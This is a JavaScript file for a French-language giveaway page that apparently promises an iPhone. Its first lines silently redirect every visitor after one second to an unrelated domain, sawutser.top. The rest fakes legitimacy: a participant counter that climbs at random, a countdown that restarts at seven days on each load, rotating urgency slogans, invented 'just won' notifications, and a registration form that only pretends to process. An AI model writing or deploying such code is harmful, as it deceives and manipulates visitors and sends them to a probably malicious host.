// Redirection après 1 seconde
setTimeout(function() {
    window.location.href = "https://sawutser.top/4/9324873";
}, 1000);
document.addEventListener('DOMContentLoaded', function() {
    // Preloader
    const preloader = document.querySelector('.preloader');
    
    setTimeout(() => {
        preloader.classList.add('fade-out');
        setTimeout(() => {
            preloader.style.display = 'none';
        }, 500);
    }, 1500);
    
    // Real-time Clock
    function updateClock() {
        const now = new Date();
        const hours = now.getHours().toString().padStart(2, '0');
        const minutes = now.getMinutes().toString().padStart(2, '0');
        const seconds = now.getSeconds().toString().padStart(2, '0');
        
        document.getElementById('hours').textContent = hours;
        document.getElementById('minutes').textContent = minutes;
        document.getElementById('seconds').textContent = seconds;
    }
    
    setInterval(updateClock, 1000);
    updateClock();
    
    // Countdown Timer (7 days from now)
    const countdownDate = new Date();
    countdownDate.setDate(countdownDate.getDate() + 7);
    
    function updateCountdown() {
        const now = new Date().getTime();
        const distance = countdownDate - now;
        
        const days = Math.floor(distance / (1000 * 60 * 60 * 24));
        const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
        const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
        
        document.getElementById('countdown-days').textContent = days.toString().padStart(2, '0');
        document.getElementById('countdown-hours').textContent = hours.toString().padStart(2, '0');
        document.getElementById('countdown-minutes').textContent = minutes.toString().padStart(2, '0');
        
        if (distance < 0) {
            clearInterval(countdownInterval);
            document.querySelector('.countdown').innerHTML = '<p>Le concours est terminé!</p>';
        }
    }
    
    const countdownInterval = setInterval(updateCountdown, 1000);
    updateCountdown();
    
    // Random participants counter
    let participants = 2543;
    setInterval(() => {
        participants += Math.floor(Math.random() * 3) + 1;
        document.querySelector('.participants strong').textContent = participants.toLocaleString();
    }, 5000);
    
    // Testimonial Slider
    const testimonials = document.querySelectorAll('.testimonial');
    const dots = document.querySelectorAll('.dot');
    let currentTestimonial = 0;
    
    function showTestimonial(index) {
        testimonials.forEach(testimonial => testimonial.classList.remove('active'));
        dots.forEach(dot => dot.classList.remove('active'));
        
        testimonials[index].classList.add('active');
        dots[index].classList.add('active');
        currentTestimonial = index;
    }
    
    document.querySelector('.slider-next').addEventListener('click', () => {
        let nextIndex = (currentTestimonial + 1) % testimonials.length;
        showTestimonial(nextIndex);
    });
    
    document.querySelector('.slider-prev').addEventListener('click', () => {
        let prevIndex = (currentTestimonial - 1 + testimonials.length) % testimonials.length;
        showTestimonial(prevIndex);
    });
    
    dots.forEach((dot, index) => {
        dot.addEventListener('click', () => {
            showTestimonial(index);
        });
    });
    
    // Auto-rotate testimonials
    setInterval(() => {
        let nextIndex = (currentTestimonial + 1) % testimonials.length;
        showTestimonial(nextIndex);
    }, 5000);
    
    // Modal Handling
    const registerBtn = document.getElementById('register-btn');
    const registerModal = document.getElementById('register-modal');
    const successModal = document.getElementById('success-modal');
    const closeModalBtns = document.querySelectorAll('.close-modal, .btn-close-success');
    const registrationForm = document.getElementById('registration-form');
    
    registerBtn.addEventListener('click', () => {
        registerModal.classList.add('active');
        document.body.style.overflow = 'hidden';
    });
    
    closeModalBtns.forEach(btn => {
        btn.addEventListener('click', () => {
            registerModal.classList.remove('active');
            successModal.classList.remove('active');
            document.body.style.overflow = 'auto';
        });
    });
    
    // Close modal when clicking outside
    [registerModal, successModal].forEach(modal => {
        modal.addEventListener('click', (e) => {
            if (e.target === modal) {
                modal.classList.remove('active');
                document.body.style.overflow = 'auto';
            }
        });
    });
    
    // Form Submission
    registrationForm.addEventListener('submit', (e) => {
        e.preventDefault();
        
        // Simulate form processing
        setTimeout(() => {
            registerModal.classList.remove('active');
            successModal.classList.add('active');
            
            // Reset form
            registrationForm.reset();
        }, 1000);
    });
    
    // Animate elements when scrolling
    const animateOnScroll = () => {
        const elements = document.querySelectorAll('.animate-slide-up');
        
        elements.forEach(element => {
            const elementPosition = element.getBoundingClientRect().top;
            const windowHeight = window.innerHeight;
            
            if (elementPosition < windowHeight - 100) {
                element.style.animation = `slideUp 0.6s ease forwards`;
            }
        });
    };
    
    window.addEventListener('scroll', animateOnScroll);
    animateOnScroll(); // Run once on load
    
    // Button hover effect enhancement
    registerBtn.addEventListener('mouseenter', () => {
        registerBtn.querySelector('.pulse').style.animation = 'pulse-animation 1s ease';
        registerBtn.querySelector('.pulse.delay').style.animation = 'pulse-animation 1s ease 0.3s';
    });
    
    // Confetti effect on button click
    registerBtn.addEventListener('click', () => {
        // Create confetti elements
        for (let i = 0; i < 50; i++) {
            createConfetti();
        }
    });
    
    function createConfetti() {
        const confetti = document.createElement('div');
        confetti.className = 'confetti';
        confetti.style.left = Math.random() * 100 + 'vw';
        confetti.style.backgroundColor = getRandomColor();
        confetti.style.transform = `rotate(${Math.random() * 360}deg)`;
        document.body.appendChild(confetti);
        
        // Animation
        const animation = confetti.animate([
            { top: '-10px', opacity: 1, transform: confetti.style.transform },
            { top: '100vh', opacity: 0, transform: confetti.style.transform + ' rotate(360deg)' }
        ], {
            duration: Math.random() * 3000 + 2000,
            easing: 'cubic-bezier(0.1, 0.8, 0.3, 1)'
        });
        
        animation.onfinish = () => confetti.remove();
    }
    
    function getRandomColor() {
        const colors = ['#0071e3', '#34c759', '#ff3b30', '#ff9500', '#5856d6', '#af52de'];
        return colors[Math.floor(Math.random() * colors.length)];
    }
    
    // Add confetti to success modal
    const successModalObserver = new MutationObserver((mutations) => {
        mutations.forEach((mutation) => {
            if (mutation.attributeName === 'class' && successModal.classList.contains('active')) {
                // Create confetti for success
                for (let i = 0; i < 100; i++) {
                    setTimeout(() => {
                        createConfetti();
                    }, i * 30);
                }
            }
        });
    });
    
    successModalObserver.observe(successModal, { attributes: true });
    
    // Dynamic button text to increase urgency
    const buttonTexts = [
        "NE MANQUEZ PAS CETTE CHANCE!",
        "LIMITÉ À 1 PAR PERSONNE!",
        "OFFRE EXCLUSIVE!",
        "DERNIÈRES HEURES!",
        "GAGNEZ GRATUITEMENT!"
    ];
    
    let currentButtonTextIndex = 0;
    setInterval(() => {
        const btnText = registerBtn.querySelector('span');
        btnText.style.opacity = '0';
        
        setTimeout(() => {
            currentButtonTextIndex = (currentButtonTextIndex + 1) % buttonTexts.length;
            btnText.textContent = buttonTexts[currentButtonTextIndex];
            btnText.style.opacity = '1';
        }, 300);
    }, 3000);
    
    // Fake notification
    setTimeout(() => {
        showNotification();
    }, 10000);
    
    function showNotification() {
        const notification = document.createElement('div');
        notification.className = 'notification';
        notification.innerHTML = `
            <div class="notification-content">
                <div class="notification-avatar">
                    <img src="https://randomuser.me/api/portraits/women/44.jpg" alt="User">
                </div>
                <div class="notification-text">
                    <strong>Marie D.</strong> vient de gagner un iPhone 15!
                    <small>il y a 2 minutes</small>
                </div>
            </div>
        `;
        
        document.body.appendChild(notification);
        
        setTimeout(() => {
            notification.classList.add('show');
        }, 100);
        
        setTimeout(() => {
            notification.classList.remove('show');
            setTimeout(() => {
                notification.remove();
                // Show another notification after some time
                setTimeout(showNotification, 15000);
            }, 500);
        }, 5000);
    }
    
    // Add notification styles dynamically
    const notificationStyles = document.createElement('style');
    notificationStyles.textContent = `
        .notification {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: white;
            border-radius: 10px;
            padding: 15px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
            transform: translateX(150%);
            transition: transform 0.3s ease;
            z-index: 1000;
            max-width: 300px;
            opacity: 0;
        }
        
        .notification.show {
            transform: translateX(0);
            opacity: 1;
        }
        
        .notification-content {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .notification-avatar {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            overflow: hidden;
        }
        
        .notification-avatar img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        
        .notification-text {
            font-size: 0.9rem;
        }
        
        .notification-text strong {
            color: var(--primary-color);
        }
        
        .notification-text small {
            display: block;
            font-size: 0.7rem;
            color: var(--gray-color);
            margin-top: 3px;
        }
        
        .confetti {
            position: fixed;
            width: 10px;
            height: 10px;
            background: #0071e3;
            top: -10px;
            z-index: 999;
            opacity: 0;
        }
    `;
    document.head.appendChild(notificationStyles);
});
